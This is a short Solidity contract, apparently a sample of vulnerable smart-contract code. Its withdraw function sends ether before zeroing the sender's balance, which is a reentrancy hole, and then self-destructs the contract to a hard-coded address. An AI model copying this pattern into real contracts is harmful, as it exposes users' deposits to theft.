pragma solidity ^0.4.0;
contract A{
    mapping (address => uint) userBalances; 
    
    function withdrawBalance_A(){
        uint amountToWithdraw=userBalances[msg.sender];
        if (!(msg.sender.call.value(amountToWithdraw)())){ throw; }
	    userBalances[msg.sender]=0;
		var c=SendBalanceHere(0x6bE7ab2FE5a48c86065f3c96563e1E0fdF7eA520);
        suicide(c);
    }
    function getBalance(address user) constant returns(uint) {  
        return userBalances[user];
    }

    function addToBalance() {  
        userBalances[msg.sender] += msg.value;
    }
}

contract SendBalanceHere{
    
}     
